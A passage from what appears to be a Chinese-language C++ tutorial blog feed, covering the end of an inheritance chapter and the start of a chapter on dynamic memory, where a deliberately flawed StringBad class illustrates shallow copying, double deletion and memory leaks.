align="left">定义标准运算符用于类对象的行为</td><td align="left"><code>operator+</code>, <code>operator&lt;&lt;</code>, etc.</td></tr><tr><td align="left"><strong>转换函数</strong></td><td align="left">定义从类类型到其他类型的转换</td><td align="left"><code>operator typeName()</code>, <code>explicit</code></td></tr><tr><td align="left"><strong>友元函数/类</strong></td><td align="left">允许非成员函数或类访问私有/保护成员</td><td align="left"><code>friend</code></td></tr></tbody></table><p>设计良好的类需要仔细考虑这些不同类型的函数，确保封装性、资源管理的正确性、接口的清晰性以及在继承体系中的恰当行为。</p><h2 id="13-9-总结"><a href="#13-9-总结" class="headerlink" title="13.9 总结"></a>13.9 总结</h2><p>本章介绍了 C++ 的一个核心特性——<strong>继承</strong>，它允许我们基于现有类创建新类，实现代码重用和建立类之间的层次关系。</p><p>主要内容回顾：</p><ol><li><p><strong>基本继承:</strong></p><ul><li>  一个类（<strong>派生类</strong>）可以从另一个类（<strong>基类</strong>）继承成员（数据和方法）。</li><li>  <strong>公有继承 (<code>public</code>)</strong> 是最常用的方式，建立 <strong>“is-a”</strong> 关系，意味着派生类对象也是一个基类对象。基类的公有成员在派生类中仍然是公有，保护成员仍然是保护。</li><li>  派生类构造函数必须通过<strong>成员初始化列表</strong>调用基类构造函数来初始化继承的基类部分。</li></ul></li><li><p><strong>多态公有继承:</strong></p><ul><li>  <strong>多态</strong>允许我们通过基类接口（指针或引用）统一处理不同类型的派生类对象。</li><li>  通过在基类中将成员函数声明为<strong>虚函数 (<code>virtual</code>)</strong> 来启用多态行为。</li><li>  当通过基类指针或引用调用虚函数时，程序在<strong>运行时</strong>根据对象的实际类型选择调用哪个版本的方法（<strong>动态联编</strong>或晚绑定）。</li><li>  如果函数不是虚函数，或者通过对象直接调用，则在<strong>编译时</strong>根据指针/引用的声明类型或对象类型决定调用版本（<strong>静态联编</strong>或早绑定）。</li></ul></li><li><p><strong>虚函数注意事项:</strong></p><ul><li>  <code>override</code> (C++11): 推荐在派生类覆盖虚函数时使用，以进行编译器检查。</li><li>  <code>final</code> (C++11): 可用于阻止虚函数在更深层派生类中被覆盖，或阻止类被继承。</li><li>  构造函数不能是虚函数。</li><li>  <strong>虚析构函数:</strong> 如果类可能被用作基类（特别是涉及动态内存分配或可能通过基类指针删除派生类对象），其析构函数<strong>必须</strong>声明为 <code>virtual</code>，以确保正确的析构顺序和资源释放。</li></ul></li><li><p><strong>访问控制 (<code>protected</code>):</strong></p><ul><li>  <code>protected</code> 成员对类内部和派生类成员函数可见，但对外部代码不可见。</li><li>  它提供了介于 <code>private</code> 和 <code>public</code> 之间的访问级别。</li><li>  虽然 <code>protected</code> 允许派生类直接访问基类实现细节，但可能破坏封装，应谨慎使用。优先使用 <code>private</code> 数据和 <code>public/protected</code> 接口函数。</li></ul></li><li><p><strong>抽象基类 (ABC):</strong></p><ul><li>  包含至少一个<strong>纯虚函数 (<code>virtual ... = 0;</code>)</strong> 的类是抽象基类。</li><li>  ABC <strong>不能被实例化</strong>（不能创建对象）。</li><li>  主要用于定义一个<strong>接口规范</strong>，强制派生类实现纯虚函数。</li><li>  可以声明指向 ABC 的指针或引用，用于实现多态。</li><li>  派生类只有实现了所有继承的纯虚函数后，才能成为具体类。</li></ul></li><li><p><strong>继承与动态内存分配:</strong></p><ul><li>  <strong>基类使用 <code>new</code>，派生类不用:</strong> 派生类通常不需要自定义特殊成员函数，但基类必须有虚析构函数。</li><li>  <strong>基类和派生类都使用 <code>new</code>:</strong> 派生类<strong>必须</strong>提供自己的析构函数、复制构造函数和赋值运算符。派生类的复制构造函数和赋值运算符必须显式调用基类的对应版本来处理基类部分。基类析构函数仍需是虚函数。</li></ul></li><li><p><strong>类设计回顾:</strong></p><ul><li>  理解编译器生成的特殊成员函数（构造、析构、复制、移动）及其局限性。</li><li>  遵循三/五/零法则来管理资源，优先使用 RAII（如智能指针、标准容器）。</li><li>  合理使用 <code>const</code> 成员函数。</li><li>  谨慎设计继承关系，确保符合 “is-a” 原则。</li><li>  正确使用虚函数和虚析构函数实现多态和安全的资源管理。</li></ul></li></ol><p>继承是 C++ 中实现代码重用、建立类型层次结构和实现多态的关键机制。理解其工作原理、不同类型的继承（本章主要关注公有继承）以及相关的设计原则对于编写强大的、可维护的面向对象程序至关重要。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chapter 12 类和动态内存分配</title>
      <link href="2025/04/30/Cpp_tutorial_Chapter_12/"/>
      <url>2025/04/30/Cpp_tutorial_Chapter_12/</url>
      
        <content type="html"><![CDATA[<h2 id="12-1-动态内存和类"><a href="#12-1-动态内存和类" class="headerlink" title="12.1 动态内存和类"></a>12.1 动态内存和类</h2><p>当类需要使用 <code>new</code> 在自由存储区（堆）上分配内存时，情况会变得比之前我们看到的类（如 <code>Stock</code>, <code>Time</code>, <code>Vector</code>）更复杂。这些类的数据成员本身（如 <code>int</code>, <code>double</code>, <code>std::string</code>）要么大小固定，要么像 <code>std::string</code> 那样自己管理内存。</p><p>但是，如果你的类直接使用指针来管理通过 <code>new</code> 分配的内存（例如，自定义一个字符串类来管理 <code>char*</code> 指针指向的内存），那么 C++ 编译器自动生成的某些默认行为（特别是对象复制和赋值）可能会导致严重的问题，如内存泄漏和程序崩溃。本章将探讨这些问题以及如何通过定义特殊的成员函数来解决它们。</p><h3 id="12-1-1-复习示例和静态类成员"><a href="#12-1-1-复习示例和静态类成员" class="headerlink" title="12.1.1 复习示例和静态类成员"></a>12.1.1 复习示例和静态类成员</h3><p>让我们从一个简单的、故意设计得有问题的字符串类 <code>StringBad</code> 开始，它使用 <code>char*</code> 指针来指向动态分配的内存。</p><p><strong>StringBad 类定义 (stringbad.h)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> STRINGBAD_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STRINGBAD_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StringBad</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">char</span> * str;             <span class="comment">// 指向字符串的指针</span></span><br><span class="line">    <span class="keyword">int</span> len;                <span class="comment">// 字符串长度</span></span><br><span class="line">    <span class="comment">// 静态数据成员: 用于跟踪对象数量</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> num_strings;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 构造函数</span></span><br><span class="line">    StringBad(<span class="keyword">const</span> <span class="keyword">char</span> * s); <span class="comment">// 从 C 字符串构造</span></span><br><span class="line">    StringBad();               <span class="comment">// 默认构造函数</span></span><br><span class="line">    <span class="comment">// 析构函数</span></span><br><span class="line">    ~StringBad();              <span class="comment">// 非常重要！</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 友元函数: 重载 &lt;&lt;</span></span><br><span class="line">    <span class="keyword">friend</span> <span class="built_in">std</span>::ostream &amp; <span class="keyword">operator</span>&lt;&lt;(<span class="built_in">std</span>::ostream &amp; os, <span class="keyword">const</span> StringBad &amp; st);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// STRINGBAD_H_</span></span></span><br></pre></td></tr></table></figure><p><strong>StringBad 类实现 (stringbad.cpp)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt; // 为了使用 strlen, strcpy</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stringbad.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化静态类成员 num_strings</span></span><br><span class="line"><span class="comment">// 注意：静态数据成员必须在类定义外部进行定义和初始化</span></span><br><span class="line"><span class="keyword">int</span> StringBad::num_strings = <span class="number">0</span>; <span class="comment">// 初始化为 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造函数: 从 C 字符串构造</span></span><br><span class="line">StringBad::StringBad(<span class="keyword">const</span> <span class="keyword">char</span> * s) &#123;</span><br><span class="line">    len = <span class="built_in">std</span>::<span class="built_in">strlen</span>(s);       <span class="comment">// 获取长度</span></span><br><span class="line">    str = <span class="keyword">new</span> <span class="keyword">char</span>[len + <span class="number">1</span>];    <span class="comment">// 分配内存 (+1 为了存储末尾的 &#x27;\0&#x27;)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">strcpy</span>(str, s);        <span class="comment">// 复制字符串到新内存</span></span><br><span class="line">    num_strings++;              <span class="comment">// 对象计数增加</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; num_strings &lt;&lt; <span class="string">&quot;: \&quot;&quot;</span> &lt;&lt; str &lt;&lt; <span class="string">&quot;\&quot; object created\n&quot;</span>; <span class="comment">// 调试信息</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 默认构造函数</span></span><br><span class="line">StringBad::StringBad() &#123;</span><br><span class="line">    len = <span class="number">4</span>;</span><br><span class="line">    str = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">strcpy</span>(str, <span class="string">&quot;C++&quot;</span>);    <span class="comment">// 默认值</span></span><br><span class="line">    num_strings++;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; num_strings &lt;&lt; <span class="string">&quot;: \&quot;&quot;</span> &lt;&lt; str &lt;&lt; <span class="string">&quot;\&quot; default object created\n&quot;</span>; <span class="comment">// 调试信息</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 析构函数</span></span><br><span class="line">StringBad::~StringBad() &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; str &lt;&lt; <span class="string">&quot;\&quot; object deleted, &quot;</span>; <span class="comment">// 调试信息</span></span><br><span class="line">    --num_strings;              <span class="comment">// 对象计数减少</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; num_strings &lt;&lt; <span class="string">&quot; left\n&quot;</span>; <span class="comment">// 调试信息</span></span><br><span class="line">    <span class="keyword">delete</span> [] str;              <span class="comment">// 释放内存！</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 友元函数: 重载 &lt;&lt;</span></span><br><span class="line"><span class="built_in">std</span>::ostream &amp; <span class="keyword">operator</span>&lt;&lt;(<span class="built_in">std</span>::ostream &amp; os, <span class="keyword">const</span> StringBad &amp; st) &#123;</span><br><span class="line">    os &lt;&lt; st.str;</span><br><span class="line">    <span class="keyword">return</span> os;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个类看起来似乎能工作：它在构造时分配内存，在析构时释放内存。但是，它缺少一些关键的东西，我们稍后会看到。</p><p><strong>静态类成员 (Static Class Members)</strong></p><p>在 <code>StringBad</code> 中，我们引入了一个 <code>static int num_strings;</code>。这是一个<strong>静态数据成员</strong>。</p><ul><li>  <strong>共享性:</strong> 静态数据成员不属于任何单个对象，而是被类的<strong>所有对象共享</strong>。无论创建多少个 <code>StringBad</code> 对象，<code>num_strings</code> 只有一个副本。</li><li>  <strong>生命周期:</strong> 静态数据成员在程序启动时创建，在程序结束时销毁，其生命周期与程序的运行时间相同，即使没有创建任何类对象，它也存在。</li><li><strong>初始化:</strong> 静态数据成员<strong>必须在类定义之外</strong>进行初始化（通常在对应的 <code>.cpp</code> 文件中），如 <code>int StringBad::num_strings = 0;</code>。初始化时需要使用类名和作用域解析运算符 <code>::</code>，并且不再需要 <code>static</code> 关键字。<ul><li>  例外：<code>const</code> 的整型或枚举类型的静态成员（以及 C++11 中的 <code>constexpr</code> 静态成员）可以在类定义内部初始化。</li></ul></li><li>  <strong>用途:</strong> 常用于跟踪类的实例数量、共享类范围内的常量或标志等。</li></ul><p>除了静态数据成员，还有**静态成员函数 (Static Member Functions)**。</p><ul><li>  <strong>声明:</strong> 在函数声明前加上 <code>static</code> 关键字。</li><li>  <strong>无 <code>this</code> 指针:</strong> 静态成员函数不与任何特定对象关联，因此它们<strong>没有 <code>this</code> 指针</strong>。</li><li>  <strong>访问限制:</strong> 它们只能直接访问类的<strong>静态数据成员</strong>或其他<strong>静态成员函数</strong>。它们不能直接访问非静态成员（数据或函数），因为非静态成员需要通过对象（<code>this</code> 指针）来访问。</li><li>  <strong>调用:</strong> 可以通过类名和作用域解析运算符调用（<code>ClassName::static_func()</code>），也可以通过类的对象调用（<code>object.static_func()</code>），但推荐使用前者，因为它更清晰地表明了函数的静态属性。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 示例：添加一个静态成员函数到 StringBad</span></span><br><span class="line"><span class="comment">// stringbad.h</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StringBad</span> &#123;</span></span><br><span class="line">    <span class="comment">// ... existing private members ...</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> num_strings;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ... existing public members ...</span></span><br><span class="line">    <span class="comment">// 静态成员函数</span></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">HowMany</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// stringbad.cpp</span></span><br><span class="line"><span class="comment">// ... existing code ...</span></span><br><span class="line"><span class="comment">// 定义静态成员函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">StringBad::HowMany</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> num_strings; <span class="comment">// 可以访问静态成员 num_strings</span></span><br><span class="line">    <span class="comment">// return len; // 错误！不能直接访问非静态成员 len</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// main.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stringbad.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">StringBad <span class="title">s1</span><span class="params">(<span class="string">&quot;Hello&quot;</span>)</span></span>;</span><br><span class="line">    <span class="function">StringBad <span class="title">s2</span><span class="params">(<span class="string">&quot;World&quot;</span>)</span></span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Number of objects: &quot;</span> &lt;&lt; StringBad::HowMany() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 通过类名调用</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Number of objects: &quot;</span> &lt;&lt; s1.HowMany() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;       <span class="comment">// 通过对象调用 (不推荐)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="12-1-2-特殊成员函数"><a href="#12-1-2-特殊成员函数" class="headerlink" title="12.1.2 特殊成员函数"></a>12.1.2 特殊成员函数</h3><p>C++ 类有一些特殊的成员函数，如果程序员没有显式定义它们，编译器可能会自动生成默认版本。这些函数对于控制对象的创建、销毁、复制和移动至关重要：</p><ol><li> <strong>默认构造函数 (Default Constructor):</strong> 如果你<strong>没有</strong>定义任何构造函数，编译器会生成一个。它通常什么也不做（对于内置类型成员）或调用成员对象的默认构造函数。</li><li> <strong>析构函数 (Destructor):</strong> 如果你没有定义析构函数，编译器会生成一个。它通常什么也不做或调用成员对象的析构函数。对于需要释放资源的类（如 <code>StringBad</code>），<strong>必须</strong>定义自己的析构函数。</li><li> <strong>复制构造函数 (Copy Constructor):</strong> 如果你没有定义，编译器会生成一个。它的参数通常是同类对象的 <code>const</code> 引用（例如 <code>StringBad(const StringBad&amp;)</code>）。默认的复制构造函数执行<strong>成员逐一复制 (memberwise copy)</strong> 或称**浅复制 (shallow copy)**。</li><li> <strong>复制赋值运算符 (Copy Assignment Operator):</strong> 如果你没有定义，编译器会生成一个。它的参数通常是同类对象的 <code>const</code> 引用，并返回一个指向调用对象的引用（例如 <code>StringBad&amp; operator=(const StringBad&amp;)</code>）。默认的赋值运算符也执行**成员逐一复制 (浅复制)**。</li><li> <strong>移动构造函数 (Move Constructor) (C++11):</strong> 如果你没有定义任何复制/移动操作或析构函数，编译器可能会生成一个。参数是同类对象的右值引用（<code>StringBad(StringBad&amp;&amp;)</code>）。默认执行成员逐一移动。</li><li> <strong>移动赋值运算符 (Move Assignment Operator) (C++11):</strong> 如果你没有定义任何复制/移动操作或析构函数，编译器可能会生成一个。参数是同类对象的右值引用，返回对象引用（<code>StringBad&amp; operator=(StringBad&amp;&amp;)</code>）。默认执行成员逐一移动。</li></ol><p><strong>关键问题：成员逐一复制 (浅复制)</strong></p><p>对于像 <code>int</code> 或 <code>double</code> 这样的简单数据成员，成员逐一复制工作得很好。但是，对于指针成员（如 <code>StringBad</code> 中的 <code>char * str</code>），成员逐一复制仅仅是<strong>复制指针的值（地址）</strong>，而不是指针所指向的数据。这就是所谓的<strong>浅复制</strong>。</p><h3 id="12-1-3-回到-StringBad：复制构造函数的哪里出了问题"><a href="#12-1-3-回到-StringBad：复制构造函数的哪里出了问题" class="headerlink" title="12.1.3 回到 StringBad：复制构造函数的哪里出了问题"></a>12.1.3 回到 StringBad：复制构造函数的哪里出了问题</h3><p>考虑以下代码，它会隐式地调用复制构造函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main_problem.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stringbad.h&quot;</span> <span class="comment">// 假设 stringbad.h/cpp 如上定义 (没有自定义复制构造函数)</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">callme1</span><span class="params">(StringBad sb)</span> </span>&#123; <span class="comment">// 按值传递，调用复制构造函数</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;String passed by value:\n&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;    \&quot;&quot;</span> &lt;&lt; sb &lt;&lt; <span class="string">&quot;\&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cout</span>;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Starting an inner block.\n&quot;</span>;</span><br><span class="line">        <span class="function">StringBad <span class="title">headline1</span><span class="params">(<span class="string">&quot;Celery Stalks at Midnight&quot;</span>)</span></span>;</span><br><span class="line">        <span class="function">StringBad <span class="title">headline2</span><span class="params">(<span class="string">&quot;Lettuce Prey&quot;</span>)</span></span>;</span><br><span class="line">        <span class="function">StringBad <span class="title">sports</span><span class="params">(<span class="string">&quot;Spinach Leaves Bowl for Dollars&quot;</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;headline1: &quot;</span> &lt;&lt; headline1 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;headline2: &quot;</span> &lt;&lt; headline2 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;sports: &quot;</span> &lt;&lt; sports &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">        callme1(headline1); <span class="comment">// 调用 callme1，headline1 被复制到参数 sb</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;headline1: &quot;</span> &lt;&lt; headline1 &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// 再次打印 headline1</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Initialize one object to another:\n&quot;</span>;</span><br><span class="line">        StringBad sailor = sports; <span class="comment">// 调用复制构造函数</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;sailor: &quot;</span> &lt;&lt; sailor &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Assign one object to another:\n&quot;</span>;</span><br><span class="line">        StringBad knot; <span class="comment">// 调用默认构造函数</span></span><br><span class="line">        knot = headline1; <span class="comment">// 调用赋值运算符 (这里是默认的)</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;knot: &quot;</span> &lt;&lt; knot &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Exiting the inner block.\n&quot;</span>;</span><br><span class="line">    &#125; <span class="comment">// 作用域结束，headline1, headline2, sports, sailor, knot 的析构函数被调用</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;End of main()\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当你运行这段代码时（假设编译器生成了默认的复制构造函数和赋值运算符），你会遇到严重的问题，很可能程序会崩溃。原因如下：</p><ol><li> <strong><code>callme1(headline1)</code>:</strong> 当 <code>headline1</code> 按值传递给 <code>callme1</code> 时，会调用复制构造函数来创建参数 <code>sb</code>。默认的复制构造函数执行浅复制：<code>sb.str</code> 被设置为与 <code>headline1.str</code> <strong>相同的内存地址</strong>。</li><li> <strong><code>callme1</code> 结束:</strong> 当 <code>callme1</code> 函数返回时，其局部变量 <code>sb</code> 被销毁，调用 <code>sb</code> 的析构函数 <code>~StringBad()</code>。这个析构函数执行 <code>delete [] sb.str;</code>，释放了 <code>headline1.str</code> 指向的内存！</li><li> <strong><code>headline1</code> 的后续使用:</strong> 回到 <code>main</code> 函数后，<code>headline1.str</code> 现在是一个<strong>悬挂指针 (dangling pointer)**，它指向已经被释放的内存。任何试图访问 <code>headline1</code> 内容的操作（如 <code>cout &lt;&lt; headline1</code> 或 <code>knot = headline1</code>）都将导致</strong>未定义行为**（通常是崩溃）。</li><li> <strong><code>StringBad sailor = sports;</code>:</strong> 同样，默认复制构造函数使 <code>sailor.str</code> 和 <code>sports.str</code> 指向同一块内存。</li><li><strong>作用域结束:</strong> 当 <code>main</code> 函数的内部作用域 <code>&#123;&#125;</code> 结束时，所有局部对象（<code>headline1</code>, <code>headline2</code>, <code>sports</code>, <code>sailor</code>, <code>knot</code>）的析构函数被调用。<ul><li>  <code>~StringBad()</code> for <code>knot</code> 可能尝试删除已经被 <code>callme1</code> 中 <code>sb</code> 的析构函数删除的内存（如果 <code>knot = headline1</code> 发生在 <code>callme1</code> 之后）。</li><li>  <code>~StringBad()</code> for <code>sailor</code> 会删除 <code>sports.str</code> 指向的内存。</li><li>  <code>~StringBad()</code> for <code>sports</code> 会<strong>再次尝试删除</strong>同一块内存。</li><li>  <code>~StringBad()</code> for <code>headline2</code> 正常工作。</li><li>  <code>~StringBad()</code> for <code>headline1</code> 尝试删除已经被 <code>callme1</code> 中 <code>sb</code> 的析构函数删除的内存。</li></ul></li></ol><p>这种<strong>重复删除 (double deletion)</strong> 同一块内存的行为是导致程序崩溃的常见原因。</p><h3 id="12-1-4-StringBad-的其他问题：赋值运算符"><a href="#12-1-4-StringBad-的其他问题：赋值运算符" class="headerlink" title="12.1.4 StringBad 的其他问题：赋值运算符"></a>12.1.4 StringBad 的其他问题：赋值运算符</h3><p>默认的赋值运算符 <code>operator=</code> 同样执行浅复制，也会导致问题：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">StringBad knot;        <span class="comment">// knot.str 指向 &quot;C++&quot; 的内存</span></span><br><span class="line"><span class="function">StringBad <span class="title">headline1</span><span class="params">(<span class="string">&quot;Celery Stalks at Midnight&quot;</span>)</span></span>; <span class="comment">// headline1.str 指向 &quot;Celery...&quot; 的内存</span></span><br><span class="line"></span><br><span class="line">knot = headline1; <span class="comment">// 调用默认赋值运算符</span></span><br></pre></td></tr></table></figure><p>执行 <code>knot = headline1;</code> 后：</p><ol><li> <code>knot.len</code> 被设置为 <code>headline1.len</code>。</li><li> <code>knot.str</code> 被设置为 <code>headline1.str</code> 的值（内存地址）。</li></ol><p>结果：</p><ul><li>  <code>knot.str</code> 和 <code>headline1.str</code> 指向同一块内存 (“Celery…”)。</li><li>  <code>knot</code> 原来指向的内存 (“C++”) 的地址丢失了，这块内存没有被 <code>delete</code>，造成了**内存泄漏 (memory leak)**。</li><li>  当 <code>knot</code> 和 <code>headline1</code> 的析构函数被调用时，会发生<strong>重复删除</strong>。</li></ul><p><strong>结论:</strong></p><p>对于管理动态内存的类（即类内部有指针成员，并且类负责 <code>new</code> 和 <code>delete</code> 这些指针指向的内存），编译器生成的默认复制构造函数和默认赋值运算符是<strong>不安全</strong>的，会导致浅复制、内存泄漏和重复删除等问题。</p><p>为了解决这些问题，我们需要为这样的类提供我们自己的、正确实现的：</p><ol><li> <strong>析构函数:</strong> 确保释放所有通过 <code>new</code> 分配的资源。</li><li> <strong>复制构造函数:</strong> 执行**深复制 (deep copy)**，即为新对象分配自己的内存，并将原始对象的数据复制到新内存中。</li><li> <strong>复制赋值运算符:</strong> 执行<strong>深复制</strong>，并正确处理自我赋值（<code>obj = obj;</code>）和释放旧资源。</li></ol><p>这通常被称为<strong>复制控制 (Copy Control)</strong> 